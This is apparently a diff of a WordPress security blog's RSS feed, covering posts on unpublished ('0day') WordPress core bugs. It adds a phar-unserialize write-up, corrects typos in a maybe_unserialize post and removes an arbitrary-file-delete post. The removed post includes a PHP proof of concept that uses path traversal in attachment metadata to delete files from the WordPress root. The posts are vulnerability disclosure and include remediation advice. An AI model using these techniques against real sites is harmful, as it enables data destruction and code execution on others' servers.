@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/tag/0day/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Mon, 27 Jul 2020 21:13:00 +0000</lastBuildDate>
+	<lastBuildDate>Fri, 07 Aug 2020 21:59:33 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,82 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.4.2</generator>
 	<item>
+		<title>WordPress and phar unserialize</title>
+		<link>https://wpdeeply.com/wordpress-and-phar-unserialize/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Fri, 07 Aug 2020 21:58:43 +0000</pubDate>
+				<category><![CDATA[core]]></category>
+		<category><![CDATA[0day]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=188</guid>
+
+					<description><![CDATA[Core team had put some effort into project in order to preven unserialize of user input via&#160;phar&#160;stream wrapper. In general, efforts are good, but to excelent there are two more grades and this is the max with this approach. In the core there is function&#160;path_join&#160;that accepts two parameters&#160;$base&#160;and&#160;$path.&#160;$path&#160;is then sent towards function&#160;path_is_absolute&#160;and from the code [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>Core team had put some effort into project in order to preven unserialize of user input via&nbsp;<code>phar</code>&nbsp;stream wrapper. In general, efforts are good, but to excelent there are two more grades and this is the max with this approach. In the core there is function&nbsp;<code>path_join</code>&nbsp;that accepts two parameters&nbsp;<code>$base</code>&nbsp;and&nbsp;<code>$path</code>.&nbsp;<code>$path</code>&nbsp;is then sent towards function&nbsp;<code>path_is_absolute</code>&nbsp;and from the code</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">function path_is_absolute( $path ) {
+	/*
+	 * Check to see if the path is a stream and check to see if its an actual
+	 * path or file as realpath() does not support stream wrappers.
+	 */
+	if ( wp_is_stream( $path ) &amp;&amp; ( is_dir( $path ) || is_file( $path ) ) ) {
+		return true;
+	}
+...
+</code></pre>
+
+
+
+<p>it is obvious that&nbsp;<code>wp_is_stream</code>&nbsp;will return&nbsp;<code>TRUE</code>&nbsp;for&nbsp;<code>phar://path_here</code>&nbsp;and will reach&nbsp;<code>is_dir</code>&nbsp;and/or&nbsp;<code>is_file</code>&nbsp;which will trigger unserialize of user input in WP.</p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-phar-unserialize.md#eli5-poc"></a>Eli5 PoC</h2>
+
+
+
+<p>In&nbsp;<code>wp_restore_image</code>&nbsp;function which could be called by any user with upload rights on WP (author user role by default) there is the following flow:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">...
+$backup_sizes     = get_post_meta( $post_id, '_wp_attachment_backup_sizes', true );
+...
+if ( isset( $backup_sizes['full-orig'] ) &amp;&amp; is_array( $backup_sizes['full-orig'] ) ) {
+		$data = $backup_sizes['full-orig'];
+...
+		$restored_file = path_join( $parts['dirname'], $data['file'] );
+		$restored      = update_attached_file( $post_id, $restored_file );
+
+</code></pre>
+
+
+
+<p>There it is, unserialize of user input. How to place custom values in&nbsp;<code>_wp_attachment_backup_sizes</code>, check the facts <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-phar-unserialize.md#few-facts"></a>Few facts</h2>
+
+
+
+<ul><li><code>import</code> capability is <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank">fatal</a> for WP because arbitrary post create from low permission user roles</li><li>this is how to meddle with <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attached-file-meta/" target="_blank">attached file</a> via <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-and-attached-file/" target="_blank">importer</a></li><li><code>path_join</code> is wide spread across <a href="https://wpdirectory.net/search/01EF5E56NN5S9VHK7BMQ9XF3BZ" target="_blank" rel="noreferrer noopener">eco system</a></li></ul>
+
+
+
+<h1><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-phar-unserialize.md#remediation"></a>Remediation</h1>
+
+
+
+<ul><li>phar vulnerabilities should be handled on <a href="https://github.com/TYPO3/phar-stream-wrapper" target="_blank" rel="noreferrer noopener">stream wrapper level</a>, not with &#8220;guarding&#8221;</li></ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>WordPress and multiple maybe_unserialize</title>
 		<link>https://wpdeeply.com/wordpress-and-multiple-maybe_unserialize/</link>
 		
@@ -29,9 +105,9 @@
 		<category><![CDATA[0day]]></category>
 		<guid isPermaLink="false">https://wpdeeply.com/?p=185</guid>
 
-					<description><![CDATA[WordPress introduced maybe_unserialize and maybe_serialize as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple maybe_unserialize towards values that could be planted into DB with lower number of maybe_serializecalls. Eli5 PoC and if you think that this code isn&#8217;t existing then [&#8230;]]]></description>
+					<description><![CDATA[WordPress introduced&#160;maybe_unserialize&#160;and&#160;maybe_serialize&#160;as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple&#160;maybe_unserialize towards values that could be planted into DB with lower number of&#160;maybe_serializecalls. Eli5 PoC and if you think that this code isn&#8217;t existing then [&#8230;]]]></description>
 										<content:encoded><![CDATA[
-<p>WordPress introduced <code>maybe_unserialize</code> and <code>maybe_serialize</code> as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple <code>maybe_unserialize</code> towards values that could be planted into DB with lower number of <code>maybe_serialize</code>calls.</p>
+<p>WordPress introduced&nbsp;<code>maybe_unserialize</code>&nbsp;and&nbsp;<code>maybe_serialize</code>&nbsp;as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple&nbsp;<code>maybe_unserialize</code> towards values that could be planted into DB with lower number of&nbsp;<code>maybe_serialize</code>calls.</p>
 
 
 
@@ -59,11 +135,11 @@ $values = array_map(
 
 
 
-<ul><li>dounble&nbsp;<code>maybe_unserialize</code>&nbsp;is quite widespread around WP eco system, specially in Woo related plugins</li></ul>
+<ul><li>double <code>maybe_unserialize</code> is quite widespread around WP eco system, specially in Woo related plugins</li></ul>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-multiple-maybe-unserialize.md#remadiation"></a>Remadiation</h2>
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-multiple-maybe-unserialize.md#remadiation"></a>Remediation</h2>
 
 
 
@@ -875,78 +951,6 @@ add_action(init, "upload_any_image");
 
 
 <ul><li><code>add_filter('wp_upload_bits', ...</code>&nbsp;where bits will be placed in tmp image with specified extension and will be validated against&nbsp;<code>wp_check_filetype_and_ext</code></li><li>check how Woo fixed this in the past <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li></ul>
-]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>WordPress arbitrary file delete</title>
-		<link>https://wpdeeply.com/wordpress-arbitrary-file-delete/</link>
-		
-		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Sun, 12 Jul 2020 23:00:08 +0000</pubDate>
-				<category><![CDATA[core]]></category>
-		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=136</guid>
-
-					<description><![CDATA[WordPress have a lot of serious issues with paths. There were several tries in the past for security and core team to fix arbitrary file delete issues in the core, but bugs (plural) still remain. Why this bug presented here exist? (there are many another use cases in the core) Because core is solving arbitrary [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<hr class="wp-block-separator"/>
-
-
-
-<p>WordPress have a lot of serious issues with paths. There were several tries in the past for security and core team to fix arbitrary file delete issues in the core, but bugs (plural) still remain. Why this bug presented here exist? (there are many another use cases in the core) Because core is solving arbitrary file delete on the following way: limit the file (thumbnail) deletion only for the same folder where is file/attachment and make sure thumbnail isn’t used by another media file. Again, technical detailed writing is huge and more advanced (will be presented in near future), but goal of this writing is something else. <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
-
-
-
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-arbitrary-file-delete.md#eli5-poc"></a>Eli5 PoC</h2>
-
-
-
-<ul><li>Upload picture in your WP and get its post_id / attachment_id</li><li>this demo code will delete&nbsp;<code>readme.html</code>&nbsp;from WP root directory</li><li>enable&nbsp;<code>hello.php</code>&nbsp;plugin and append this code at the end</li></ul>
-
-
-
-<pre class="wp-block-code"><code lang="php" class="language-php">function afd(){
-    
-    global $wpdb;
-    
-    $attachment_id = "93";
-    $thumb = "readme.html" 
-    //set up 'thumb' on the same way core does
-    $newmeta          = wp_get_attachment_metadata( $attachment_id, true );
-    $newmeta['thumb'] = wp_basename( $thumb );
-    wp_update_attachment_metadata( $attachment_id, $newmeta );
-    
-    //set up apropriate value for _wp_attached_file
-    $wpdb->query("UPDATE `wp_postmeta` SET `meta_value` = '../../license.txt' WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = '".esc_sql($attachment_id)."'");
-    //delete attachment    
-    wp_delete_attachment($attachment_id);
-}
-
-add_action("init", "afd");
-</code></pre>
-
-
-
-<ul><li><code>readme.html</code>&nbsp;is deleted from the WP root</li></ul>
-
-
-
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-arbitrary-file-delete.md#few-facts"></a>Few facts</h2>
-
-
-
-<ul><li><code>_wp_attached_file</code>&nbsp;remains single point of failure for WP</li><li>there is use case in the core where creation of backup of any file is possible and this opens door for silent exploitation when arbitrary file delete is in game</li></ul>
-
-
-
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-arbitrary-file-delete.md#remediation"></a>Remediation</h2>
-
-
-
-<ul><li>core files shouldn’t be writable by www-data user</li><li>plugins files shouldn’t be writable by www-data user</li></ul>
 ]]></content:encoded>
 					
 		
